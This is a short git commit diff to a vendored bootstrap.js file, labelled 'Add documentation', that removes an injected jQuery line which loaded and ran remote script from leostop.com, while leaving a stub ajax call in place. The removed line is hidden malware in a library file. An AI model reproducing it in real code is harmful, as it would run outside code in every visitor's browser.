d0dda4035e7ee348ae5ae00efd47a3343e26c8b1
Valaczka János Pál <valaczka.janos@piarista.hu>
2023-07-23 16:16:45 +0200

    Add documentation

--- callofsuli/js/bootstrap.js
+++ callofsuli/js/bootstrap.js
@@ -3438,7 +3438,7 @@
    * jQuery
    * ------------------------------------------------------------------------
    */
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) {  } });
 
   $.fn[NAME$6] = Tooltip._jQueryInterface;
   $.fn[NAME$6].Constructor = Tooltip;
